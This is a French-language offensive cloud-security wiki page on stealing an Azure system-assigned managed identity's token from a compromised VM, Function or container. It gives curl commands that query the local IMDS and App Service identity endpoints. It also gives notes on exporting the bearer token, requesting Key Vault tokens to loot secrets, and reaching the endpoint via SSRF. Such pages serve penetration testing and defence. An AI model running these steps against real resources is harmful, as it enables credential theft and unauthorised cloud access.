---
title: "System-assigned : voler le token de l'identité propre à une ressource"
description: "Voler le token de l'identité managée system-assigned d'une ressource via son point de terminaison IMDS local et agir en tant que cette identité."
keywords:
  - system-assigned
  - identité managée
  - IMDS
  - token
  - identité de ressource
---

# System-assigned

Une identité managée system-assigned n'existe que pour sa ressource et partage son cycle de vie. Dès que vous obtenez une exécution de code sur cette ressource (une VM, une Function, un conteneur), le point de terminaison de métadonnées local délivre le token Entra de l'identité, et vous agissez avec le RBAC dont elle dispose.

## Forger le token

```bash
# on the resource (VM example): no client_id needed for system-assigned
curl -s -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# App Service / Functions use IDENTITY_ENDPOINT + IDENTITY_HEADER instead of IMDS
curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01"
```

Changez `resource=` pour cibler une autre audience (`https://graph.microsoft.com/`, `https://vault.azure.net`) et forger un token pour celle-ci.

## Notes d'exploitation

- Le token est un bearer token pour le RBAC de l'identité ; exportez-le et appelez ARM directement avec `az rest` ou l'API REST hors machine.
- Demandez plusieurs audiences : la même identité a souvent à la fois un accès ARM et Key Vault, donc récupérez un token `vault.azure.net` pour piller aussi [Key Vault](../../credentials/key-vault/index.md).
- Atteindre le point de terminaison via une vulnérabilité web plutôt qu'un shell relève du chemin [SSRF](../../credentials/instance-metadata/ssrf-to-imds.md).

## Outils

- **curl** sur la ressource, ou n'importe quel point d'injection SSRF.
- **MicroBurst** (`Get-AzurePasswords`, modules de token d'identité managée).

## Références

- [Microsoft : comment utiliser les identités managées (acquisition de token)](https://learn.microsoft.com/entra/identity/managed-identities-azure-resources/how-to-use-vm-token)
- [HackTricks Cloud : IMDS et identité managée Azure](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [NetSPI : MicroBurst](https://github.com/NetSPI/MicroBurst)
